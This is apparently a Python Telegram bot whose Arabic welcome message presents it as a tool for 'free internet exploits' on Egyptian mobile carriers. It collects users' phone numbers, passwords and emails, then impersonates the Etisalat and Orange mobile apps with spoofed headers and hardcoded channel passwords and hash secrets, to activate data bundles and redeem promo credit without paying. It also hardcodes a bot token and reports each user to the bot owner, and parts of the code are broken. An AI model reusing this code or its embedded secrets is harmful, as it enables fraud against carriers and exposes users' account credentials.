import telebot
import requests
import base64
import xml.etree.ElementTree as ET
import hashlib
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "6736219238:AAFoPW8oQW4m7CIOKWx4YREFJIbt5NslSgc"
CHANNEL_USERNAME = '@ElZAEM_Team'
OWNER_CHAT_ID = '6552799655'  # Replace with the bot owner's chat ID

bot = TeleBot(TOKEN)

def check_subscription(chat_id):
    url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={CHANNEL_USERNAME}&user_id={chat_id}"
    res = requests.get(url).json()
    if res['ok']:
        status = res['result']['status']
        return status in ["creator", "member", "administrator"]
    return False

def notify_owner(user):
    message = f"مستخدم بداء البوت\nالاسم: {user.first_name}\nاليوزر: @{user.username if user.username else 'N/A'}"
    bot.send_message(OWNER_CHAT_ID, message)

@bot.message_handler(commands=["start"])
def start_message_handler(message):
    user = message.from_user
    chat_id = message.chat.id
    notify_owner(user)  # Notify the bot owner

    if check_subscription(chat_id):
        keyboard = InlineKeyboardMarkup()
        buttons = [
            InlineKeyboardButton("قسم اتصالات", callback_data='inline_button'),
            InlineKeyboardButton("قسم اورنج", callback_data='inline_button1'),
            InlineKeyboardButton("تنزيل ", url='https://t.me/Mm_9_bot')
        ]
        keyboard.add(*buttons)
        photo_url = "https://t.me/MM_5_1/2"
        caption_text = """
مرحبا بك في بوت Ꮶ Ξ Ꭱ Ꮎ ✨⭐️
⚋ ⚋ ⚋ ⚋ ⚋ ⚋ ⚋ ⚋ ⚋ ⚋ ⚋⚋ ⚋ ⚋ ⚋ ⚋
البوت متخصص لثغرات الانترنت المجاني
⚋ ⚋ ⚋ ⚋ ⚋ ⚋ ⚋ ⚋ ⚋ ⚋ ⚋⚋ ⚋ ⚋ ⚋ ⚋
اختار ماذا تريد التفعيل من الاسفل 💥👇
"""
        bot.send_photo(chat_id, photo_url, caption=caption_text, reply_markup=keyboard)
    else:
        bot.send_message(chat_id, f'يجب عليك الاشتراك بقناة البوت 👇\n{CHANNEL_USERNAME}\n- ثم اضغط  \n/start')

@bot.callback_query_handler(func=lambda call: call.data == 'inline_button')
def callback_query_inline_button(call):
    keyboard = InlineKeyboardMarkup()
    button = InlineKeyboardButton("ساعتين اتصالات", callback_data='500_mb')
    keyboard.add(button)
    bot.send_message(call.message.chat.id, "مرحبا بك في قسم اتصالات 💚", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == 'inline_button1')
def callback_query(call):
    keyboard = InlineKeyboardMarkup()
    button = InlineKeyboardButton("500 ميجا", callback_data='execute_command')
    keyboard.add(button)
    bot.send_message(call.message.chat.id, "مرحبا بك في قسم اورانج 🧡", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == '500_mb')
def process_callback_500_mb(call):
    bot.send_message(call.message.chat.id, "ادخل رقم الهاتف 📲")
    bot.register_next_step_handler(call.message, validate_phone_number)

def validate_phone_number(m):
    global n
    phone_number = m.text
    if len(phone_number) != 11 or not phone_number.isdigit():
        bot.send_message(m.chat.id, "رقم الهاتف غير صحيح ⚠")
        bot.register_next_step_handler(m, validate_phone_number)
    else:
        n = phone_number
        bot.send_message(m.chat.id, "ادخل الباسورد  📩")
        bot.register_next_step_handler(m, validate_password)

def validate_password(m):
    global p
    p = m.text
    bot.send_message(m.chat.id, "ادخل الايميل 📧")
    bot.register_next_step_handler(m, validate_email)

def validate_email(m):
    global e
    e = m.text
    if "@" not in e:
        bot.send_message(m.chat.id, "الايميل غير صحيح ⚠️")
        bot.register_next_step_handler(m, validate_email)
    else:
        if "01" in n:
            nu = n[1:]
        else:
            nu = n
        c = f"{e}:{p}"
        c_b = c.encode("ascii")
        b_b = base64.b64encode(c_b)
        a = b_b.decode("ascii")
        x_a = f"Basic {a}"
        #... rest of the code...
        u_l = "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan"
        h_l = {
            "applicationVersion": "2",
            "applicationName": "MAB",
            "Accept": "text/xml",
            "Authorization": x_a,
            "APP-BuildNumber": "964",
            "APP-Version": "27.0.0",
            "OS-Type": "Android",
            "OS-Version": "12",
            "APP-STORE": "GOOGLE",
            "Is-Corporate": "false",
            "Content-Type": "text/xml; charset=UTF-8",
            "Content-Length": "1375",
            "Host": "mab.etisalat.com.eg:11003",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11",
            "ADRUM_1": "isMobile:true",
            "ADRUM": "isAjax:true"
        }
        d_l = """<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<loginRequest>
    <deviceId></deviceId>
    <firstLoginAttempt>true</firstLoginAttempt>
    <modelType></modelType>
    <osVersion></osVersion>
    <platform>Android</platform>
    <udid></udid>
</loginRequest>"""
        l_o = requests.post(u_l, headers=h_l, data=d_l)
        if "true" in l_o.text:
            s_t = l_o.headers["Set-Cookie"]
            c_k = s_t.split(";")[0]
            b_r = l_o.headers["auth"]
            u = f"https://mab.etisalat.com.eg:11003/Saytar/rest/zero11/offersV3?req=<dialAndLanguageRequest><subscriberNumber>{nu}</subscriberNumber><language>1</language></dialAndLanguageRequest>"
            h = {
                'applicationVersion': "2",
                'Content-Type': "text/xml",
                'applicationName': "MAB",
                'Accept': "text/xml",
                'Language': "ar",
                'APP-BuildNumber': "10459",
                'APP-Version': "29.9.0",
                'OS-Type': "Android",
                'OS-Version': "11",
                'APP-STORE': "GOOGLE",
                'auth': f"Bearer {b_r}",
                'Host': "mab.etisalat.com.eg:11003",
                'Is-Corporate': "false",
                'Connection': "Keep-Alive",
                'Accept-Encoding': "gzip",
                'User-Agent': "okhttp/5.0.0-alpha.11",
                'Cookie': c_k
            }
            r = requests.get(u, headers=h)
            if r.status_code == 200:
                r_o = ET.fromstring(r.text)
                o_f = None
                for c_t in r_o.findall('.//mabCategory'):
                    for p_r in c_t.findall('.//mabProduct'):
                        for p_a in p_r.findall('.//fulfilmentParameter'):
                            if p_a.find('name').text == 'Offer_ID':
                                o_f = p_a.find('value').text
                                break
                        if o_f:
                            break
                    if o_f:
                        break
            else:
                b.send_message(m.chat.id, """
عفوا حاول تاني بكره ⛔
""")
        else:
            b.send_message(m.chat.id, """
الرقم او الباسورد غلط 🚫
""")
        if "true" in l_o.text:
            s_t = l_o.headers["Set-Cookie"]
            c_k = s_t.split(";")[0]
            b_r = l_o.headers["auth"]
            u_s = "https://mab.etisalat.com.eg:11003/Saytar/rest/zero11/submitOrder"
            h_s = {
                "applicationVersion": "2",
                "applicationName": "MAB",
                "Accept": "text/xml",
                "Cookie": c_k,
                "Language": "ar",
                "APP-BuildNumber": "964",
                "APP-Version": "27.0.0",
                "OS-Type": "Android",
                "OS-Version": "12",
                "APP-STORE": "GOOGLE",
                "auth": f"Bearer {b_r}",
                "Is-Corporate": "false",
                "Content-Type": "text/xml; charset=UTF-8",
                "Content-Length": "1375",
                "Host": "mab.etisalat.com.eg:11003",
                "Connection": "Keep-Alive",
                "User-Agent": "okhttp/5.0.0-alpha.11"
            }
            d_s = f"""<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
<submitOrderRequest>
    <mabOperation></mabOperation>
    <msisdn>{nu}</msisdn>
    <operation>ACTIVATE</operation>
    <parameters>
        <parameter>
            <name>GIFT_FULLFILMENT_PARAMETERS</name>
            <value>Offer_ID:{o_f};ACTIVATE:True;isRTIM:Y</value>
        </parameter>
    </parameters>
    <productName>FAN_ZONE_HOURLY_BUNDLE</productName>
</submitOrderRequest>"""
            s_s = requests.post(u_s, headers=h_s, data=d_s).text
            if "true" in s_s:
                bot.send_message(m.chat.id, """
تم تفعيل بنجاح ✅
""")
            else:
                bot.send_message(m.chat.id, """
تحقق من بياناتك 🔊
""")

@bot.callback_query_handler(func=lambda call: call.data == 'execute_command')
def execute_command(call):
    bot.send_message(call.message.chat.id, "ادخل رقم الهاتف  📲")

    bot.register_next_step_handler(call.message, process_phone_number)

def process_phone_number(message):
    number = message.text
    bot.send_message(message.chat.id, "ادخل الباسورد  📩")

    bot.register_next_step_handler(message, process_password, number)

def process_password(message, number):
    password = message.text

    try:
        url2 = "https://services.orange.eg/GetToken.svc/GenerateToken"
        headers2 = {
            "Content-Type": "application/json; charset=UTF-8",
            "Content-Length": "78",
            "Host": "services.orange.eg",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttpwhitepro/3.12.1"
        }
        data2 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
        re2 = requests.post(url2, headers=headers2, data=data2).json()
        ctv1 = re2["GenerateTokenResult"]
        ctv = ctv1["Token"]
        h = hashlib.sha256((ctv + ',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest()
        htv = h.upper()
        ur1 = 'https://services.orange.eg/SignIn.svc/SignInUser'
        headers = {'_ctv': ctv, '_htv': htv,
                   'Content-type': 'application/json',
                   'Accept': 'application/json',
                   'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 6 Pro MIUI/V10.3.6.0.PEKMIXM)',
                   'Host': 'services.orange.eg',
                   'Accept-Encoding': 'gzip'}
        data1 = '{"appVersion":"2.9.8","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}' % (
            number, password)
        req1 = requests.post(ur1, headers=headers, data=data1)
        resp = req1.json()['SignInUserResult']["ErrorDescription"]
        if 'Success' in resp:
            b.send_message(message.chat.id, "Done login")
            userid = req1.json()["SignInUserResult"]["UserData"]["UserID"]
            url = "https://services.orange.eg/APIs/Promotions/api/CAF/Redeem"
            hed = {"_ctv": ctv, "_htv": htv,
                   "isEasyLogin": "false",
                   "UserId": userid,
                   "Content-Type": "application/json; charset=UTF-8",
                   "Content-Length": "190",
                   "Host": "services.orange.eg",
                   "Connection": "Keep-Alive",
                   "Accept-Encoding": "gzip",
                   "User-Agent": "okhttpwhitepro/3.12.1"}
            json = {"Language": "ar",
                    "OSVersion": "Android7.0",
                    "PromoCode": "رمضان كريم",
                    "dial": number,
                    "password": password,
                    "Channelname": "MobinilAndMe",
                    "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF"}
            res1 = requests.post(url, headers=hed, json=json).json()
            y = res1["ErrorDescription"]
            if y == "Success":
                bot.send_message(message.chat.id, "تم اضافة 524 ميجا بنجاح ✅")
            else:
                bot.send_message(message.chat.id, "انت واخد 500 ميجا قريب 🤕")
        else:
            bot.send_message(message.chat.id, "رقم الهاتف او الباسورد خطأ ❌")
    except:
        bot.send_message(message.chat.id, "تم ارسال المعلومات بشكل خاطيء")

print("Welcome To Bot Wevy ♡")
bot.polling(none_stop=True)
